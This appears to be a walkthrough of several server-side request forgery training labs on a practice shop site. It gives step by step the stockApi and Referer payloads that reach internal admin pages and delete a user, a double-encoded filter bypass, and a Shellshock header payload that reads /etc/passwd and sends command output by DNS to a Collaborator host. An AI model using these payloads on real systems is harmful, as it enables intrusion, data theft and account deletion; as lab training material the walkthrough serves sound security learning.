# Server-side request forgery (SSRF)

<img src="images/image1.png" alt="third" width="500">

**Step1 :**

Click on view detail

Then click on check stock  

<img src="images/image2.png" alt="third" width="500">

**Step2 :**

Send the post request to repeater

<img src="images/image3.png" alt="third" width="500">

**Step3 :**

Change the stock api value to

`http://localhost/admin/delete?username=admin`

<img src="images/image4.png" alt="third" width="500">

<img src="images/image5.png" alt="third" width="500">

**Step1 :**

Click on view detail

Then click on check stock  

<img src="images/image2.png" alt="third" width="500">

**Step2 :**

Send the post product/stock request to intruder

<img src="images/image6.png" alt="third" width="500">

Change the stockapi to `stockApi=http://192.168.0.1:8080/admin`

<img src="images/image7.png" alt="third" width="500">

Select the ip and apply number payload

<img src="images/image8.png" alt="third" width="500">

In result we have one 200 request

<img src="images/image9.png" alt="third" width="500">

**Step3 :**

Send the request to intruder and change stock api to…

`stockApi=http://192.168.0.176:8080/admin/delete?username=carlos`

<img src="images/image10.png" alt="third" width="500">

<img src="images/image14.png" alt="third" width="500">

**Step1 :**

When we change parameter it show the following error

<img src="images/image15.png" alt="third" width="500">

Now we click on next product button

<img src="images/image17.png" alt="third" width="500">

We have the get request

<img src="images/image18.png" alt="third" width="500">

**Step2 :**

Send the request to repeater

And make the change

`/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin`

<img src="images/image19.png" alt="third" width="500">

From the result it is clear that carlos is accessible

**Step3 :**

Click on check stock and modify the check stock request to

  

```
stockApi=/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Url encode the above query

<img src="images/image20.png" alt="third" width="500">

<img src="images/image21.png" alt="third" width="500">

**Step1 :**

Click on view product

<img src="images/image22.png" alt="third" width="500">

**Step2 :**

We have this request

<img src="images/image23.png" alt="third" width="500">

Send the request to repeater and change referrer to collaborator id  

<img src="images/image24.png" alt="third" width="500">

In collaborator we have

<img src="images/image25.png" alt="third" width="500">

And the lab is solved

<img src="images/image26.png" alt="third" width="500">

**Step1 :**

First we click on view product

<img src="images/image27.png" alt="third" width="500">

**Step2 :**

Install extension from Bapp name "Collaborator Everywhere"

<img src="images/image28.png" alt="third" width="500">

**Step3 :**

Now add the lab to scope of extension

<img src="images/image29.png" alt="third" width="500">

Right click on add to scope

Go to lab and refresh page we can see response

<img src="images/image30.png" alt="third" width="500">

**Step4 :**

Here one thing is clear that there is a blind SSRF because collaborator show interaction with endpoint

Send the below request to intruder

<img src="images/image31.png" alt="third" width="500">

**Step5 :**

Add a shell lock payload to user agent

This is payload:

`Referer:() { :;}; echo "NS:" $(</etc/passwd)`

In our case it look like

`() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`

Add it to User-agent

And change the referrer to

`http://192.168.0.1:8080`

And add a number payload to 1

Payload setting

<img src="images/image32.png" alt="third" width="500">

We can see interaction with a specific IP with in range in collaborator

<img src="images/image33.png" alt="third" width="500">

**Step6 :**

Submit the answer peter-ROBIX

<img src="images/image34.png" alt="third" width="500">

**Step1 :**

Click on view product id -> check stock

**Step2 :**

Send the POST request method to repeater

<img src="images/image35.png" alt="third" width="500">

Decode the stockApi by ctrl+shift+u

`http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`

Now we replace this with

`https://localhost:80/`

<img src="images/image36.png" alt="third" width="500">

Now we append   stock.weliketoshop.net

<img src="images/image37.png" alt="third" width="500">

So it show an internal server error

Remove @stock.weliketoshop.net from request using #

`stockApi=http://localhost:80#@stock.weliketoshop.net/`

<img src="images/image38.png" alt="third" width="500">

So we double encode #

`stockApi=http://localhost:80%2523@stock.weliketoshop.net/`

<img src="images/image39.png" alt="third" width="500">

And we have 200 ok result

Now we simple access admin and delete user carlos
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
<img src="images/image40.png" alt="third" width="500">
